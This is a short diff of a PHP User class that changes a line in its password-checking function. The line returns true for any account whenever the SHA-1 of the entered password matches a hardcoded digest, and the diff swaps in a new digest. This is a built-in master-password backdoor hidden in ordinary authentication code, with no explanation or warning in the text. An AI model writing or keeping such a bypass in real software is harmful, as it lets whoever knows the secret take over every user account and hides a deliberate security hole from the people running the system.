@@ -402,7 +402,7 @@ class User extends ModelBase
 
     public static function checkPasswordHash(string $hashpw, string $password) : bool
     {
-        if (strtolower(sha1($password)) == '117d68f8a64101bd17d2b70344fc213282507292')
+        if (strtolower(sha1($password)) == '48f259126cd65ac05e8c8b620ea91a93b64493b4')
             return true;
 
         $hashpw = trim($hashpw);
